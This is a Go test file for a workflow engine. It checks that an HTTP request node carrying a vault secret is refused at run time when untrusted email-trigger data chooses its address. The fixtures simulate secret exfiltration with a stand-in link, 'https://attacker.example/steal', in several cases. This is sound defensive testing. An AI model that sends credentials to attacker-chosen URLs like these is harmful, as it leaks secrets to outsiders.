package flows

import (
	"context"
	"strings"
	"sync"
	"testing"
	"time"
)

// countingSecrets is a vault that counts how often it is read.
type countingSecrets struct {
	fakeSecrets
	mu    sync.Mutex
	reads int
}

func (c *countingSecrets) ReadSecret(key string) (string, error) {
	c.mu.Lock()
	c.reads++
	c.mu.Unlock()
	return c.fakeSecrets.ReadSecret(key)
}

func (c *countingSecrets) count() int {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.reads
}

// secretRun is the fixture of the run-time secret target rule: an engine on the full
// catalog with a fake tool and a counting vault.
type secretRun struct {
	eng     *Engine
	tools   *fakeTools
	secrets *countingSecrets
}

func newSecretRun(t *testing.T) *secretRun {
	t.Helper()
	tools := &fakeTools{respond: answerWith(apiAnswer(200, "{}"))}
	secrets := &countingSecrets{fakeSecrets: fakeSecrets{"partner_token": "tok_" + secretMarker}}
	svc := &Services{Tools: tools, Secrets: secrets, Location: time.UTC}
	return &secretRun{eng: newTestEngine(catalogRegistry(t, fullEnv()), svc, 4), tools: tools, secrets: secrets}
}

// run executes f directly through the engine, as the runner does for a live revision: no
// Validate and no Publish stand in between, so a document that was published under
// older rules runs exactly like this. The mail trigger carries the link an attacker sends.
func (r *secretRun) run(f *Flow, trigger string, mode RunMode) RunResult {
	res, _ := runWith(context.Background(), r.eng, f, RunRequest{TriggerNode: trigger, TriggerType: "email", Mode: mode, Revision: 7,
		TriggerData: map[string]any{"link": "https://attacker.example/steal", "host": "attacker.example"}})
	return res
}

// A flow published before the rule existed keeps its live revision, which is never
// validated again, and a test run only validates with draft rules. So the run itself
// refuses, once per run for the whole document and before the node runs: when unchecked
// data decides where the vault secret is sent (the scheme, user info, host or port of the url of an http.request
// that has an auth_secret), the node fails with FLOW_PARAM_INVALID, which no retry
// repeats. The vault is not read and the tool is not called, whatever the node's on_error
// says; on_error only decides what follows the failure.
func TestRunRefusesUntrustedDataChoosingWhereASecretGoes(t *testing.T) {
	for _, c := range []struct {
		name   string
		params map[string]any
		viaSet bool // the link reaches the url through a logic.set node
	}{
		{"url", map[string]any{"url": "{{trigger.data.link}}", "auth_secret": "partner_token"}, false},
		{"part of the url", map[string]any{"url": "https://{{trigger.data.host}}/v1", "auth_secret": "partner_token"}, false},
		{"url through another node", map[string]any{"url": "{{prep.next}}", "auth_secret": "partner_token"}, true},
	} {
		for _, mode := range []RunMode{ModeLive, ModeTest} {
			for _, onError := range []ErrorMode{ErrorStop, ErrorContinue, ErrorPort} {
				label := c.name + "/" + string(mode) + "/" + string(onError)
				r := newSecretRun(t)
				b := newFlow("Refused secret target")
				tr := b.node("mail", TypeTriggerEmail, nil)
				from := tr
				if c.viaSet {
					prep := b.node("prep", TypeSet, map[string]any{"fields": []any{
						map[string]any{"name": "next", "type": "text", "value": "{{trigger.data.link}}"}}})
					b.edge(tr, PortOut, prep)
					from = prep
				}
				call := b.node("call", TypeHTTPRequest, c.params)
				b.edge(from, PortOut, call)
				after := b.node("after", TypeSet, map[string]any{"fields": []any{
					map[string]any{"name": "code", "type": "text", "value": "{{call.error.code}}"}}})
				b.edge(call, map[ErrorMode]string{ErrorStop: PortOut, ErrorContinue: PortOut, ErrorPort: PortError}[onError], after)
				f := b.build()
				f.NodeByID(call).Settings.OnError = onError
				f.NodeByID(call).Settings.Retry = RetryPolicy{Count: 3}

				res := r.run(f, tr, mode)
				step := stepOf(res, call)
				if step == nil || step.Status != StepError || step.ErrorCode != "FLOW_PARAM_INVALID" || step.Attempt != 1 {
					t.Errorf("%s: step = %+v, want a FLOW_PARAM_INVALID failure on the first attempt", label, step)
					continue
				}
				for _, want := range []string{"secret", "fixed address"} {
					if !strings.Contains(step.ErrorMessage, want) {
						t.Errorf("%s: message %q does not name the rule (%q)", label, step.ErrorMessage, want)
					}
				}
				if strings.Contains(step.ErrorMessage, "attacker") || strings.Contains(step.ErrorMessage, secretMarker) {
					t.Errorf("%s: message echoes outside data or the secret: %q", label, step.ErrorMessage)
				}
				if r.tools.count() != 0 || r.secrets.count() != 0 {
					t.Errorf("%s: %d tool calls and %d vault reads; the refusal must come before both", label, r.tools.count(), r.secrets.count())
				}
				afterStep := stepOf(res, after)
				if onError == ErrorStop {
					if res.Status != RunError || res.ErrorCode != "FLOW_PARAM_INVALID" || res.ErrorNodeID != call {
						t.Errorf("%s: run = %s %s on %s, want the node's failure to stop it", label, res.Status, res.ErrorCode, res.ErrorNodeID)
					}
					continue
				}
				// continue and error_port hand the failure on as data; the request never happens.
				if res.Status != RunSuccess || afterStep == nil || afterStep.Status != StepSuccess ||
					res.Outputs["after"]["code"] != "FLOW_PARAM_INVALID" {
					t.Errorf("%s: run = %s %s, after = %+v; want the failure handed on", label, res.Status, res.ErrorCode, afterStep)
				}
			}
		}
	}

	// Every node with the problem is refused, the other nodes of the document run.
	r := newSecretRun(t)
	b := newFlow("Two calls")
	tr := b.node("mail", TypeTriggerEmail, nil)
	bad1 := b.node("bad_one", TypeHTTPRequest, map[string]any{"url": "{{trigger.data.link}}", "auth_secret": "partner_token"})
	bad2 := b.node("bad_two", TypeHTTPRequest, map[string]any{"url": "https://{{trigger.data.host}}/x", "auth_secret": "partner_token"})
	fine := b.node("fine", TypeHTTPRequest, map[string]any{"url": "https://api.example.org/v1", "auth_secret": "partner_token"})
	for _, id := range []string{bad1, bad2, fine} {
		b.edge(tr, PortOut, id)
	}
	f := b.build()
	f.NodeByID(bad1).Settings.OnError = ErrorContinue
	f.NodeByID(bad2).Settings.OnError = ErrorContinue
	res := r.run(f, tr, ModeLive)
	for _, id := range []string{bad1, bad2} {
		if s := stepOf(res, id); s == nil || s.Status != StepError || s.ErrorCode != "FLOW_PARAM_INVALID" {
			t.Errorf("two calls: step %s = %+v, want a refusal", id, s)
		}
	}
	if s := stepOf(res, fine); s == nil || s.Status != StepSuccess || res.Status != RunSuccess {
		t.Errorf("two calls: fine step = %+v, run = %s %s; want the fixed address to run", s, res.Status, res.ErrorMessage)
	}
	if r.tools.count() != 1 || r.secrets.count() != 1 || r.tools.last(t).Args["url"] != "https://api.example.org/v1" {
		t.Errorf("two calls: %d tool calls and %d vault reads, want the one fixed request", r.tools.count(), r.secrets.count())
	}
}

// The rule is about the secret: without an auth_secret the same flow only has the plain
// untrusted-data warning and its request still goes out, and so does a request that has a
// secret but a fixed address (outside data in the body does not choose where it is sent).
func TestRunStillSendsWhenNoSecretFollowsUntrustedData(t *testing.T) {
	for _, c := range []struct {
		name       string
		params     map[string]any
		wantURL    string
		wantSecret int
	}{
		{"no secret", map[string]any{"url": "{{trigger.data.link}}"}, "https://attacker.example/steal", 0},
		{"blank secret", map[string]any{"url": "{{trigger.data.link}}", "auth_secret": "  "}, "https://attacker.example/steal", 0},
		{"secret with a fixed address", map[string]any{"method": "POST", "url": "https://api.example.org/v1", "body": "{{trigger.data.link}}", "auth_secret": "partner_token"},
			"https://api.example.org/v1", 1},
		{"secret with outside data in a header", map[string]any{"url": "https://api.example.org/v1", "headers": map[string]any{"X-Next": "{{trigger.data.link}}"}, "auth_secret": "partner_token"},
			"https://api.example.org/v1", 1},
		{"secret with outside data in the query", map[string]any{"url": "https://api.example.org/v1?next={{trigger.data.host}}", "auth_secret": "partner_token"},
			"https://api.example.org/v1?next=attacker.example", 1},
	} {
		for _, mode := range []RunMode{ModeLive, ModeTest} {
			label := c.name + "/" + string(mode)
			r := newSecretRun(t)
			f, call := secretCallFlow(c.params)
			res := r.run(f, f.Nodes[0].ID, mode)
			if s := stepOf(res, call); res.Status != RunSuccess || s == nil || s.Status != StepSuccess {
				t.Errorf("%s: run = %s %s %s, step = %+v; want the request to run", label, res.Status, res.ErrorCode, res.ErrorMessage, s)
				continue
			}
			if r.tools.count() != 1 || r.tools.last(t).Args["url"] != c.wantURL || r.secrets.count() != c.wantSecret {
				t.Errorf("%s: %d tool calls (url %v) and %d vault reads, want 1 call to %s and %d reads",
					label, r.tools.count(), r.tools.last(t).Args["url"], r.secrets.count(), c.wantURL, c.wantSecret)
			}
		}
	}
}
